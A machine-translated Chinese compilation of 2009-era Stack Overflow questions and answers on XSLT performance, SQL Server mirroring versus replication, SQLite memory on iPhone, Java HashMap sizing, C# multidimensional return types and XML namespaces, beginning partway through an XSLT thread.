如果您发布您的 XSLT，则更容易告诉您可能的瓶颈在哪里。通常要小心 XPath 表达式，例如 '//'、previous::* 和 following::*。更多规则和最佳实践：

> 1.  避免重复使用`"//item"`.
> 2.  不要多次评估同一个节点集；将其保存在变量中。
> 3.  `<xsl:number>`如果可以，请避免。例如，通过使用 position()。
> 4.  例如，使用`<xsl:key>`来解决分组问题。
> 5.  避免模​​板规则中的复杂模式。相反，在规则内使用。
> 6.  `preceding[-sibling]`使用或 `following[-sibling]`轴时要小心。这通常表示具有 n 平方性能的算法。
> 7.  不要对同一个节点集进行多次排序。如有必要，将其保存为结果树片段并使用`node-set()`扩展功能访问它。
> 8.  要输出简单`#PCDATA`元素 的文本值，`<xsl:value-of>`请优先 使用`<xsl:apply-templates>`.
> 
> （来自[http://www.dpawson.co.uk/xsl/sect4/N9883.html#d15756e150](http://www.dpawson.co.uk/xsl/sect4/N9883.html#d15756e150)）

遵循这些规则通常会产生非常高效的 XSLT，并且您可能根本不需要使用分析器。

关于您在浏览器中关于 XSLT 的问题：我不推荐它，因为首先您不是独立于平台的（并非每个浏览器都可能支持它，或者某些浏览器可能只支持性能不佳的引擎），其次您无法控制使用的发动机。

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2009-01-12T19:09:52.527

**如果您提供 XSLT 代码和您发现问题所在的 XML 文档，我和其他人可以尝试提供帮助**。

**以下是[Michael Kay](http://saxonica.blogharbor.com/blog)的一些[XSLT 使用和性能提示](http://www.biglist.com/lists/xsl-list/archives/200006/msg00088.html)**：

**如何有效使用 XSLT 的八个技巧**：

1.  保持源文件小。如有必要，请先拆分文档。
2.  在运行之间保持 XSLT 处理器（和 Java VM）加载到内存中
3.  如果您重复使用相同的样式表，请先编译它。
4.  如果您重复使用相同的源文档，请将其保存在内存中。
5.  如果您重复执行相同的转换，请不要。而是存储结果。
6.  保持输出文档小。例如，如果您要生成 HTML，请使用 CSS。
7.  切勿多次验证同一个源文档。
8.  将复杂的转换分成几个阶段。

**如何编写高效的 X** SLT 的八个技巧：

1.  避免重复使用“ `//item`”。
2.  不要多次评估同一个节点集；将其保存在变量中。
3.  `<xsl:number>`如果可以，请避免。例如，通过使用`position()`.
4.  例如，使用`<xsl:key>`来解决分组问题。
5.  避免模​​板规则中的复杂模式。相反，`<xsl:choose>`在规则内使用。
6.  `preceding[-sibling]`使用或`following[-sibling]` 轴时要小心。这通常表明算法具有`n`平方性能。
7.  不要对同一个节点集进行多次排序。如有必要，将其保存为结果树片段并使用`node-set()`扩展功能访问它。
8.  要输出简单 #PCDATA 元素的文本值，`<xsl:value-of>` 请优先使用`<xsl:apply-templates>`.

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-12T10:02:45.283

商业[Oxygen XML](http://www.oxygenxml.com/)编辑器具有分析和调试 XSLT 文件的功能。它也是一个很好的 XML 编辑器。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-12T10:14:30.283

我喜欢在基于 Windows 的机器上使用[Altova 的 XMLSpy](http://www.altova.com/)。它还内置了一个分析器。您可以[查看有关使用编辑器的视频](http://www.wonderhowto.com/how-to/video/how-to-edit-debug-and-profile-xslt-1-0-and-2-0-with-xmlspy-217858/)。（扫描至 5:45 以了解有关探查器的更多信息）。它是一种商业产品……有时间试用期:)

# sql - 镜像与复制

> ID：434982
> 
> 赞同：14
> 
> 时间：2009-01-12T10:01:08.033
> 
> 标签：sql, sql-server-2005

如何决定在 SQL Server 2005 中选择复制还是镜像以同时提供数据可用性和性能。

* * *

为了更具体地了解我的 SQL 服务器架构，我有一个由 2 个节点组成的主动/主动集群，用于负载平衡，我还有另一台用于复制的服务器，仅用于报告，我想确定哪种技术最好同时提供可用性和性能，事务复制还是数据库镜像？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-01-18T01:24:30.157

这取决于您需要的备用可用性级别（热、暖、冷）。

> SQL Server 中的各种机制提供数据库级冗余，例如备份/恢复、日志传送和数据库镜像（在 SQL Server 2005 及更高版本中）。数据库镜像是唯一提供受保护数据库的实时、精确副本并保证零数据丢失（当镜像同步时）的机制。

数据库镜像以同步或异步模式运行。在异步操作下，事务提交无需等待镜像服务器将日志写入磁盘，从而最大限度地提高性能。

这份 MS 白皮书《[使用数据库镜像提供高可用性](http://download.microsoft.com/download/d/9/4/d948f981-926e-40fa-a026-5bfcf076d9b9/ReplicationAndDBM.docx)》涵盖了一系列场景。

您可能应该阅读这篇 TechNet 文章[Database Mirroring Best Practices and Performance Considerations](http://www.microsoft.com/technet/prodtechnol/sql/2005/technologies/dbm_best_pract.mspx)。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-01-20T13:37:52.680

事实证明，数据库镜像阻止了直接访问数据，镜像数据只能通过数据库快照访问，因此来自快照数据的报告不会是最新的，所以我将使用数据库事务复制来提供高可用性和负载平衡。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-01-12T10:35:58.773

我不知道 SQL Server 2005，但对于一般的 SQL 用法，我总是更喜欢复制。您必须在应用程序中分离读取/写入（对于 MySQL，有 MySQL Proxy 可以为您以代理方式执行此操作），但获得可扩展的系统。（读取从机，写入主机）

镜像意味着主-主复制，这会导致并发/事务问题。即使在 master-master 场景中，您也不应该将写入查询发送到不同的服务器*。*根据您项目的大小，接下来的步骤将是添加更多从站，然后添加另一个主站+其从站以实现冗余。

```
master --- master
  |          |
slave       slave
  |          |
slave       slave
  |          |
slave       slave 
```

即使这样，您也只会向一个主服务器发送写查询，但如果主服务器失败，您可以自动将第二台主服务器提升到新的写查询目标。

# iphone - 在 iphone 中使用 sqlite 数据库时的内存管理

> ID：434988
> 
> 赞同：3
> 
> 时间：2009-01-12T10:05:15.683
> 
> 标签：iphone, sqlite

我的应用程序使用 SQLite 数据库来存储用户的输入。输入中的记录数将达到大约 100 条记录，并且我在应用程序中进行了很多 SQL 操作。

当我使用对象分配运行应用程序时，它显示 sqlite 库 libsqlite3.0.dylib 占用了大量内存。libsqlite 框架会不会导致内存泄漏？与数据库通信的最佳方式是什么？有很多 sql 调用增加了我的应用程序的内存使用量。

有人可以让我知道在应用程序中有效使用 sqlite 的最佳方法是什么。（我使用 SQLiteBooks 示例作为参考）

谢谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-01-12T10:45:04.277

Sqlite 对请求使用缓存。不时关闭并重新打开数据库以释放缓存内存。

除非您的内存要求很高，否则您不应该关心。

**您可以在UIApplicationDelegate**方法**applicationDidReceiveMemoryWarning**或**UIViewController**委托方法**didReceiveMemoryWarning**中捕获关键条件

 **如果调用其中一种方法，请关闭并重新打开数据库。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-01-12T11:09:53.463

我还没有看到由 sqlite 引起的任何内存泄漏。它确实使用了合理的内存块，但想想你需要编写多少代码以及需要缓存多少数据来做同样的事情......

最好的建议是使用高效的 SQL 并尽快重置语句句柄。完成您准备好的陈述也可能会有所帮助，尽管我还没有发现这样做的必要性。

人们经常建议定期关闭和重新打开数据库。虽然这不会造成伤害，但我自己并没有看到任何实际的好处。

最后，在 sqlite 网站上，您将看到有关[管理内存的功能的](http://sqlite.org/c3ref/release_memory.html)讨论。这些听起来很诱人，直到您意识到它们是可选的并且在 iPhone 的默认构建中未启用。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-01-12T14:48:16.580

还有一些[PRAGMA 可以修改缓存大小](http://www.sqlite.org/pragma.html#modify)。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-01-12T15:38:50.720

连续执行许多 INSERT（> 1000）时，我在 SQLite 中的内存使用量猛增。写入性能也很慢。通过将执行 INSERT 的循环包装在事务中，这些问题几乎完全消除了。我针对[这个问题](https://stackoverflow.com/questions/429655/using-pointers-in-objective-c-for-nsmutablearray-objects#431213)发布了一些示例代码。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-11-21T02:16:41.377

您**真的**想限制 iphone 应用程序中 sqlite 的缓存大小。当您启动应用程序并初始化数据库时，运行如下命令：

```
const char *pragmaSql = "PRAGMA cache_size = 50";
if (sqlite3_exec(database, pragmaSql, NULL, NULL, NULL) != SQLITE_OK) {
    NSAssert1(0, @"Error: failed to execute pragma statement with message '%s'.", sqlite3_errmsg(database));
} 
```

这将防止 sqlite 缓存您的查询并慢慢消耗您的所有内存。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-01-12T15:04:03.520

由于索引不佳，当我拥有一个相对较大的数据库时，我已经看到内存使用量激增。如果您在数据库中添加一些经过深思熟虑的索引，这是一种在现实世界中恢复内存使用的快速简便的方法。

# java - HashMap 初始化参数（load/initialcapacity）

> ID：434989
> 
> 赞同：37
> 
> 时间：2009-01-12T10:05:17.790
> 
> 标签：java, collections, hashmap

我应该传递什么值来为 N 个项目创建一个有效`HashMap`/基于结构的结构？`HashMap`

在 an`ArrayList`中，有效数是 N（N 已经假设未来增长）。a 的参数应该是什么`HashMap`？((int)(N * 0.75d), 0.75d)？更多的？较少的？改变负载系数有什么影响？

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2009-01-12T10:12:37.667

关于负载因子，我将简单地引用[HashMap javadoc](http://java.sun.com/javase/6/docs/api/java/util/HashMap.html)：

> 作为一般规则，默认负载因子 (.75) 在时间和空间成本之间提供了良好的折衷。较高的值会减少空间开销，但会增加查找成本（反映在 HashMap 类的大多数操作中，包括 get 和 put）。在设置其初始容量时，应考虑映射中的预期条目数及其负载因子，以尽量减少重新哈希操作的次数。如果初始容量大于最大条目数除以负载因子，则不会发生重新哈希操作。

这意味着，负载因子不应从 更改`.75`，除非您要进行一些特定的优化。初始容量是您唯一要更改的内容，并根据您的`N`值-含义`(N / 0.75) + 1`或该区域的某些内容进行设置。这将确保表总是足够大并且不会发生重新散列。

* * *

## 回答 #2

> 赞同：21
> 
> 时间：2012-08-15T14:06:38.997

我进行了一些[单元测试](http://blog.scottlogic.com/2012/08/14/efficient-map-initialization-in-java.html)以查看这些答案是否正确，结果证明使用：

```
(int) Math.ceil(requiredCapacity / loadFactor); 
```

因为初始容量给出了你想要的 a`HashMap`或 a `Hashtable`。通过“你想要什么”，我的意思是向`requiredCapacity`地图添加元素不会导致它包装的数组调整大小，并且数组不会大于所需的大小。由于默认负载容量为 0.75，因此像这样初始化 HashMap 可以：

```
... = new HashMap<KeyType, ValueType>((int) Math.ceil(requiredCapacity / 0.75)); 
```

由于 HashSet 实际上只是 HashMap 的包装器，因此同样的逻辑也适用于那里，即您可以像这样有效地构造 HashSet：

```
.... = new HashSet<TypeToStore>((int) Math.ceil(requiredCapacity / 0.75)); 
```

@Yuval Adam 的回答对于所有情况都是正确的，除了`(requiredCapacity / 0.75)`2 的幂，在这种情况下它分配了太多的内存。
@NotEdible 的答案在许多情况下使用了太多内存，因为 HashMap 的构造函数本身处理它希望 maps 数组的大小是 2 的幂的问题。

* * *

## 回答 #3

> 赞同：17
> 
> 时间：2013-04-18T11:19:40.620

在 Google 的[guava 库](https://code.google.com/p/guava-libraries/%20guava%20libraries)中，有一个函数可以创建针对预期数量的项目优化的 HashMap：[newHashMapWithExpectedSize](http://google.github.io/guava/releases/21.0/api/docs/com/google/common/collect/Maps.html#newHashMapWithExpectedSize-int-)

来自文档：

> 创建一个 HashMap 实例，该实例具有足够高的“初始容量”，它应该容纳 expectedSize 元素而不会增长......

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2009-01-12T10:19:35.763

同样值得注意的是，在较小的一侧使用 HashMap 会使哈希冲突更有可能发生，这会减慢查找速度。因此，如果您真的担心地图的速度，而不太担心地图的大小，则可能值得将其设置得对于它需要容纳的数据来说有点太大。由于内存很便宜，我通常为已知数量的项目初始化 HashMaps

```
HashMap<Foo> myMap = new HashMap<Foo>(numberOfElements * 2); 
```

随意不同意，事实上我很想验证或抛弃这个想法。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2009-11-25T15:02:39.697

Yuval 给出的答案只对 Hashtable 是正确的。HashMap 使用二的幂次方桶，所以对于 HashMap，Zarkonnen 实际上是正确的。您可以从源代码中验证这一点：

```
 // Find a power of 2 >= initialCapacity
  int capacity = 1;
  while (capacity < initialCapacity)
  capacity <<= 1; 
```

因此，尽管 0.75f 的负载因子在 Hashtable 和 HashMap 之间仍然相同，但您应该使用初始容量 n*2，其中 n 是您计划存储在 HashMap 中的元素数。这将确保最快的获取/放置速度。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-02-25T02:02:08.413

参考 HashMap 源代码会有所帮助。

如果条目数达到阈值（容量 * 负载因子），则会自动进行重新散列。这意味着负载因子太小会随着条目的增长而导致频繁的重新散列。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2010-07-27T16:03:17.737

在大多数情况下，`List`使用以下大小参数进行or`Map`初始化是安全的。`List``Map`

```
List<T>(numElements + (numElements / 2));
Map<T,T>(numElements + (numElements / 2)); 
```

这遵循**.75****`* 2`**规则，并且比上述操作节省了一点开销。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-01-12T10:18:33.347

> 在 ArrayList 中，有效数字是 N（N 已经假设未来增长）。

嗯，不，它没有，除非我误解了你在说什么。当您将整数传递给 Arraylist 构造函数时，它将创建一个与该大小完全相同的底层数组。如果事实证明您甚至需要一个额外的元素，那么当您下次调用 add() 时，ArrayList 将需要调整底层数组的大小，从而导致此调用花费比通常更长的时间。

另一方面，如果您在谈论考虑到增长的 N 值 - 那么是的，如果您可以保证该值永远不会超过此值，那么调用这样的 Arraylist 构造函数是合适的。在这种情况下，正如 Hank 所指出的，映射的类似构造函数将是 N 和 1.0f。即使您碰巧超过 N，这也应该合理地执行（尽管如果您希望这会定期发生，您可能希望为初始大小传递更大的数字）。

如果您不知道，负载因子是地图容量增加的点，占总容量的一小部分。

*编辑*：Yuval 可能是对的，对于通用地图，将负载因子保持在 0.75 左右是一个更好的主意。如果您的键具有顺序哈希码（例如顺序整数键），则 1.0 的负载因子会表现出色，但对于其他任何事情，您可能会遇到与哈希桶的冲突，这意味着查找某些元素需要更长的时间。创建比严格必要的更多的桶将减少这种碰撞的机会，这意味着元素有更多的机会位于自己的桶中，因此可以在最短的时间内检索到。正如文档所说，这是时间与空间的权衡。如果其中任何一个对您特别重要（如分析器所示，而不是过早优化！），您可以强调这一点；否则，坚持使用默认值。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-07-03T19:24:55.437

对于关键系统中非常大的 HashMap，初始容量错误可能会带来很大的问题，您可能需要经验信息来确定如何最好地初始化 Map。

CollectionSpy ( [collectionspy.com](http://www.collectionspy.com) ) 是一个新的 Java 分析器，它可以让您在眨眼之间看到哪些 HashMap 接近需要重新散列，过去已经重新散列了多少次等等。确定基于容量的容器构造函数的安全初始容量参数的理想工具。

# c# - 如果返回多维数组，如何设计此方法？

> ID：434996
> 
> 赞同：2
> 
> 时间：2009-01-12T10:08:37.440
> 
> 标签：c#, .net, arrays, methods, multidimensional-array

我现在正在设计一个 SNMP 库。问题是由这样的特殊功能引起的，

*** GetTable(字符串 id)

这个函数有时可能返回一个二维数组Variable[,]，但也可能返回Variable[,,] 和具有更多维度的数组。所以我认为返回Variable[,]、Variable[,,]等固定数组是不合理的。

但是这个方法应该返回什么呢？如何设计它？自定义 VariableCollection 怎么样？

欢迎任何建议。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-12T10:19:27.667

作为一般规则，返回自定义类型可以在数据表示方面提供更大的灵活性。我还倾向于提供您自己的方法来访问此集合中的数据，而不是公开多维数组。

我自己通常避免使用多维矩形数组。在许多情况下，多维锯齿状数组更方便，因为您可以单独取出切片。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T10:17:42.693

好吧，您可以返回`Array`并让调用者检查`.Rank`?

当然，首先返回一个数组可能不是最好的选择（取决于场景）：[数组被认为有些有害](http://blogs.msdn.com/ericlippert/archive/2008/09/22/arrays-considered-somewhat-harmful.aspx)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-12T11:21:54.157

返回一个多维数组是一个冒险的选择。我建议实现一个自定义集合以及获取有关其内部状态的信息的方法以及从中获取数据的方法。当客户端调用您的方法时，它更灵活且不易出错。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-12T11:27:23.757

如果创建公共 Api，建议返回强类型集合 <T>。所以我会创建一个自定义对象，它可以获取您想要返回的所需数据，然后使用 .net 集合 < T > 来返回它。

希望这可以帮助。

# xml - 制作新的 XML 标记时，它们是否需要位于命名空间中？

> ID：434997
> 
> 赞同：1
> 
> 时间：2009-01-12T10:10:51.990
> 
> 标签：xml, namespaces

我不确定有效/正确的 XML 是否需要命名空间。我可以在 XML 文档中添加任意标签而无需为它们定义/声明命名空间吗？

我认为命名空间是一个好主意，可能是最佳实践，但我只想知道它们是否是强制性的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-12T10:24:47.250

命名空间不是必需的，但在将来的某个时候，您会很高兴您使用它们。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-12T10:46:36.350

> 我可以在 XML 文档中添加任意标签而无需为它们定义/声明命名空间吗？

这取决于您所说的“有效/正确的 XML”是什么意思。对于格式正确，任何属性（无论是否在命名空间中）都是可以接受的。

另一方面，“有效性”与模式具有特定的含义。是否允许向现有元素添加属性取决于相关文档的模式定义。这可以是 XML Schema、DOCTYPE 或其他类似 RELAX-NG 的东西。如果您的文档没有声明模式，那么“有效性”的概念就没有意义，您可以继续在您喜欢的地方添加属性。

例如，对于普通 doctype 的 XHTML 文档，添加任何属性都是无效的。但是，如果需要，您可以使用您自己的扩展从 XHTML 中提取您自己的文档类型。例如，“XHTML plus MathML plus SVG”文档类型就是这样做的。这使用名称空间来区分取自每种语言的部分；如果您混合来自不同规格的概念，通常是一个好主意。

正如 Hank 所说，您不需要这样做，但是将一些 xmlns 属性放入其中不会花费您任何费用，并且它为混合/嵌入文档奠定了坚实的基础。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-12T11:16:28.520

命名空间在 XML 中不是严格要求的，但是，正如之前所述，它们可以让您的代码更有条理，就像编程语言中的命名空间一样。如果您想了解更具体的信息，可以阅读[此 W3C 建议](http://www.w3.org/TR/REC-xml-names/)，其中解释了命名空间格式正确和命名空间有效文档的含义。*****